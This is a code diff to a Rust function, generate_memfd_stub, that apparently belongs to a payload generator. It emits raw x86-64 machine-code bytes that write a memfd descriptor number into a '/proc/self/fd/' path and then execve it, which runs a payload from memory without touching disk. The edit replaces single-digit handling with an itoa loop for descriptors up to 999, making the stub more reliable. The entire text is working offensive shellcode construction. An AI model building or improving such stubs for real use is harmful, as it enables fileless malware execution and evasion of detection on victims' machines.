@@ -251,12 +251,30 @@ pub fn generate_memfd_stub(payload: &[u8], _arch: Arch) -> Result<Vec<u8>, Paylo
     stub.extend_from_slice(&[
         0x48, 0x89, 0x47, 0x08,                          // mov [rdi+8], rax
     ]);
-    // Write fd number as ASCII at offset 14
+    // Write fd number as ASCII at offset 14 (handles fd 0-999)
+    // itoa: divide r12 by 10 repeatedly, write digits in reverse
     stub.extend_from_slice(&[
-        0x4C, 0x89, 0xE0,                               // mov rax, r12
-        0x48, 0x83, 0xC0, 0x30,                          // add rax, '0' (works for single digit)
-        0x88, 0x47, 0x0E,                                // mov [rdi+14], al
-        0xC6, 0x47, 0x0F, 0x00,                          // mov byte [rdi+15], 0
+        0x4C, 0x89, 0xE0,                               // mov rax, r12  ; fd value
+        0x48, 0x8D, 0x4F, 0x12,                          // lea rcx, [rdi+18] ; end of buffer
+        0xC6, 0x01, 0x00,                                // mov byte [rcx], 0 ; null terminator
+        // digit_loop:
+        0x48, 0xFF, 0xC9,                                // dec rcx
+        0x48, 0x31, 0xD2,                                // xor rdx, rdx
+        0x48, 0xC7, 0xC6, 0x0A, 0x00, 0x00, 0x00,      // mov rsi, 10
+        0x48, 0xF7, 0xF6,                                // div rsi  ; rax=quotient, rdx=remainder
+        0x80, 0xC2, 0x30,                                // add dl, '0'
+        0x88, 0x11,                                      // mov [rcx], dl
+        0x48, 0x85, 0xC0,                                // test rax, rax
+        0x75, 0xEC,                                      // jnz digit_loop (-20)
+        // Copy digits to offset 14: rcx points to first digit
+        0x48, 0x8D, 0x77, 0x0E,                          // lea rsi, [rdi+14]  ; dest = "/proc/self/fd/" + 14
+        // copy_loop:
+        0x8A, 0x01,                                      // mov al, [rcx]
+        0x88, 0x06,                                      // mov [rsi], al
+        0x48, 0xFF, 0xC1,                                // inc rcx
+        0x48, 0xFF, 0xC6,                                // inc rsi
+        0x84, 0xC0,                                      // test al, al
+        0x75, 0xF4,                                      // jnz copy_loop (-12)
     ]);
 
     // execve(path, argv={path, NULL}, envp={NULL})
